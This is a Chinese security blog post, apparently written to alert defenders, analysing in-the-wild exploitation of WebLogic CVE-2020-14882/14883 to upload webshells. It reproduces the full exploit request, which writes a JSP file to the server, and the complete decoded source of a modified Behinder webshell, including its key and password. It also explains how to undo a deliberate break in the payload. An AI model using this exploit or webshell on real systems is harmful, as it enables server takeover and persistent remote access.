@@ -1,0 +1,113 @@
+## 背景
+
+近期基于利用Weblogic未授权命令执行漏洞（CVE-2020-14882/14883）EXP的出现，导致了很多小黑尝试使用新的方式进行webshell的上传，分享下近期所遇到的。
+
+## 详情分析
+
+### uri
+
+uri为
+/console/images/%252e%252e%252fconsole.portal，Weblogic未授权命令执行漏洞EXP的复现可见（<https://www.cnblogs.com/potatsoSec/p/13895120.html>）
+
+### payload
+
+>
+> _nfpb=true&ampamp_pageLabel=&ampamphandle=com.tangosol.coherence.mvel2.sh.ShellSession(%22data='PCUhIFN0cmluZyB4Yz0iM2M2ZTBiOGE5YzE1MjI0YSI7IFN0cmluZyBwYXNzPSJsb2xfcGFzcyI7IFN0cmluZyBtZDU9bWQ1KHBhc3MreGMpOyBjbGFzcyBYIGV4dGVuZHMgQ2xhc3NMb2FkZXJ7cHVibGljIFgoQ2xhc3NMb2FkZXIgeil7c3VwZXIoeik7fXB1YmxpYyBDbGFzcyBRKGJ5dGVbXSBjYil7cmV0dXJuIHN1cGVyLmRlZmluZUNsYXNzKGNiLCAwLCBjYi5sZW5ndGgpO30gfXB1YmxpYyBieXRlW10geChieXRlW10gcyxib29sZWFuIG0peyB0cnl7amF2YXguY3J5cHRvLkNpcGhlciBjPWphdmF4LmNyeXB0by5DaXBoZXIuZ2V0SW5zdGFuY2UoIkFFUyIpO2MuaW5pdChtPzE6MixuZXcgamF2YXguY3J5cHRvLnNwZWMuU2VjcmV0S2V5U3BlYyh4Yy5nZXRCeXRlcygpLCJBRVMiKSk7cmV0dXJuIGMuZG9GaW5hbChzKTsgfWNhdGNoIChFeGNlcHRpb24gZSl7cmV0dXJuIG51bGw7IH19IHB1YmxpYyBzdGF0aWMgU3RyaW5nIG1kNShTdHJpbmcgcykge1N0cmluZyByZXQgPSBudWxsO3RyeSB7amF2YS5zZWN1cml0eS5NZXNzYWdlRGlnZXN0IG07bSA9IGphdmEuc2VjdXJpdHkuTWVzc2FnZURpZ2VzdC5nZXRJbnN0YW5jZSgiTUQ1Iik7bS51cGRhdGUocy5nZXRCeXRlcygpLCAwLCBzLmxlbmd0aCgpKTtyZXQgPSBuZXcgamF2YS5tYXRoLkJpZ0ludGVnZXIoMSwgbS5kaWdlc3QoKSkudG9TdHJpbmcoMTYpLnRvVXBwZXJDYXNlKCk7fSBjYXRjaCAoRXhjZXB0aW9uIGUpIHt9cmV0dXJuIHJldDsgfSBwdWJsaWMgc3RhdGljIFN0cmluZyBiYXNlNjRFbmNvZGUoYnl0ZVtdIGJzKSB0aHJvd3MgRXhjZXB0aW9uIHtDbGFzcyBiYXNlNjQ7U3RyaW5nIHZhbHVlID0gbnVsbDt0cnkge2Jhc2U2ND1DbGFzcy5mb3JOYW1lKCJqYXZhLnV0aWwuQmFzZTY0Iik7T2JqZWN0IEVuY29kZXIgPSBiYXNlNjQuZ2V0TWV0aG9kKCJnZXRFbmNvZGVyIiwgbnVsbCkuaW52b2tlKGJhc2U2NCwgbnVsbCk7dmFsdWUgPSAoU3RyaW5nKUVuY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImVuY29kZVRvU3RyaW5nIiwgbmV3IENsYXNzW10geyBieXRlW10uY2xhc3MgfSkuaW52b2tlKEVuY29kZXIsIG5ldyBPYmplY3RbXSB7IGJzIH0pO30gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7dHJ5IHsgYmFzZTY0PUNsYXNzLmZvck5hbWUoInN1bi5taXNjLkJBU0U2NEVuY29kZXIiKTsgT2JqZWN0IEVuY29kZXIgPSBiYXNlNjQubmV3SW5zdGFuY2UoKTsgdmFsdWUgPSAoU3RyaW5nKUVuY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImVuY29kZSIsIG5ldyBDbGFzc1tdIHsgYnl0ZVtdLmNsYXNzIH0pLmludm[9]rZShFbmNvZGVyLCBuZXcgT2JqZWN0W10geyBicyB9KTsgdmFsdWUgPSB2YWx1ZS5yZXBsYWNlKCJcbiIsICIiKS5yZXBsYWNlKCJcciIsICIiKTt9IGNhdGNoIChFeGNlcHRpb24gZTIpIHt9fXJldHVybiB2YWx1ZTsgfSBwdWJsaWMgc3RhdGljIGJ5dGVbXSBiYXNlNjREZWNvZGUoU3RyaW5nIGJzKSB0aHJvd3MgRXhjZXB0aW9uIHtDbGFzcyBiYXNlNjQ7Ynl0ZVtdIHZhbHVlID0gbnVsbDt0cnkge2Jhc2U2ND1DbGFzcy5mb3JOYW1lKCJqYXZhLnV0aWwuQmFzZTY0Iik7T2JqZWN0IGRlY29kZXIgPSBiYXNlNjQuZ2V0TWV0aG9kKCJnZXREZWNvZGVyIiwgbnVsbCkuaW52b2tlKGJhc2U2NCwgbnVsbCk7dmFsdWUgPSAoYnl0ZVtdKWRlY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImRlY29kZSIsIG5ldyBDbGFzc1tdIHsgU3RyaW5nLmNsYXNzIH0pLmludm[9]rZShkZWNvZGVyLCBuZXcgT2JqZWN0W10geyBicyB9KTt9IGNhdGNoIChFeGNlcHRpb24gZSkge3RyeSB7IGJhc2U2ND1DbGFzcy5mb3JOYW1lKCJzdW4ubWlzYy5CQVNFNjREZWNvZGVyIik7IE9iamVjdCBkZWNvZGVyID0gYmFzZTY0Lm5ld0luc3RhbmNlKCk7IHZhbHVlID0gKGJ5dGVbXSlkZWNvZGVyLmdldENsYXNzKCkuZ2V0TWV0aG9kKCJkZWNvZGVCdWZmZXIiLCBuZXcgQ2xhc3NbXSB7IFN0cmluZy5jbGFzcyB9KS5pbnZva2UoZGVjb2RlciwgbmV3IE9iamVjdFtdIHsgYnMgfSk7fSBjYXRjaCAoRXhjZXB0aW9uIGUyKSB7fX1yZXR1cm4gdmFsdWU7IH0lPjwlIHRyeXtieXRlW10gZGF0YT1iYXNlNjREZWNvZGUocmVxdWVzdC5nZXRQYXJhbWV0ZXIocGFzcykpO2RhdGE9eChkYXRhLCBmYWxzZSk7aWYgKHNlc3Npb24uZ2V0QXR0cmlidXRlKCJwYXlsb2FkIik9PW51bGwpe3Nlc3Npb24uc2V0QXR0cmlidXRlKCJwYXlsb2FkIixuZXcgWChwYWdlQ29udGV4dC5nZXRDbGFzcygpLmdldENsYXNzTG9hZGVyKCkpLlEoZGF0YSkpO31lbHNle3JlcXVlc3Quc2V0QXR0cmlidXRlKCJwYXJhbWV0ZXJzIiwgbmV3IFN0cmluZyhkYXRhKSk7T2JqZWN0IGY9KChDbGFzcylzZXNzaW9uLmdldEF0dHJpYnV0ZSgicGF5bG9hZCIpKS5uZXdJbnN0YW5jZSgpO2YuZXF1YWxzKHBhZ2VDb250ZXh0KTtyZXNwb25zZS5nZXRXcml0ZXIoKS53cml0ZShtZDUuc3Vic3RyaW5nKDAsMTYpKTtyZXNwb25zZS5nZXRXcml0ZXIoKS53cml0ZShiYXNlNjRFbmNvZGUoeChiYXNlNjREZWNvZGUoZi50b1N0cmluZygpKSwgdHJ1ZSkpKTtyZXNwb25zZS5nZXRXcml0ZXIoKS53cml0ZShtZDUuc3Vic3RyaW5nKDE2KSk7fSB9Y2F0Y2ggKEV4Y2VwdGlvbiBlKXt9JT4=';data=new
+> String(new sun.misc.BASE64Decoder().decodeBuffer(data));out=new
+> java.io.PrintWriter('servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/f017eb39be25f75d3facbb55bb677e05.jsp');out.print(data);out.close();%22);
+
+payload转码后为冰蝎魔改的webshell，结果如下见下面，原始数据命中xx敏感词造成无法发布,以上数据要删除m[9]中的[]
+
+### 冰蝎魔改
+
+对data进行base64转码结果如下：可见其为冰蝎魔改其中3c6e0b8a9c15224a是 **“key”!**
+的MD5的前16位，其中pass为lol_pass。
+
+    
+    
+    <%! 
+    String xc="3c6e0b8a9c15224a"; 
+    String pass="lol_pass"; 
+    String md5=md5(pass+xc); 
+    class X extends ClassLoader{
+        public X(ClassLoader z){
+            super(z);
+        }
+        public Class Q(byte[] cb){
+            return super.defineClass(cb, 0, cb.length);
+        } 
+    }
+    public byte[] x(byte[] s,boolean m){
+        try{
+            javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");
+            c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));
+            return c.doFinal(s); 
+        }
+        catch (Exception e){
+            return null; 
+        }} 
+        public static String md5(String s) {
+            String ret = null;
+            try {
+                java.security.MessageDigest m;
+                m = java.security.MessageDigest.getInstance("MD5");
+                m.update(s.getBytes(), 0, s.length());
+                ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
+            } 
+            catch (Exception e) {
+    
+            }
+            return ret; 
+        } 
+        public static String base64Encode(byte[] bs) throws Exception {
+            Class base64;
+            String value = null;
+            try {
+                base64=Class.forName("java.util.Base64");
+                Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
+                value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });
+            } catch (Exception e) {
+                try { 
+                    base64=Class.forName("sun.misc.BASE64Encoder");
+                    Object Encoder = base64.newInstance(); 
+                    value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs }); 
+                    value = value.replace("\n", "").replace("\r", "");
+                    } catch (Exception e2) {}
+                }
+                return value; 
+            } 
+            public static byte[] base64Decode(String bs) throws Exception {
+                Class base64;byte[] value = null;
+                try {base64=Class.forName("java.util.Base64");
+                Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
+                value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });
+            } catch (Exception e) {
+                try { 
+                    base64=Class.forName("sun.misc.BASE64Decoder"); 
+                    Object decoder = base64.newInstance(); 
+                    value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });
+                    } catch (Exception e2) {}
+                }
+                return value; 
+            }
+        %>
+        <% 
+        try{byte[] data=base64Decode(request.getParameter(pass));
+        data=x(data, false);
+        if (session.getAttribute("payload")==null){
+            session.setAttribute("payload",new X(pageContext.getClass().getClassLoader()).Q(data));
+        }else{
+            request.setAttribute("parameters", new String(data));
+            Object f=((Class)session.getAttribute("payload")).newInstance();
+            f.equals(pageContext);
+            response.getWriter().write(md5.substring(0,16));
+            response.getWriter().write(base64Encode(x(base64Decode(f.toString()), true)));
+            response.getWriter().write(md5.substring(16));
+            } 
+        }catch (Exception e){}
+    %>
+
+## 总结
+
+近期利用Weblogic未授权命令执行漏洞（CVE-2020-14882/14883）进行webshell上传的比较多，多关注系统是否有异常，多打补丁。
+
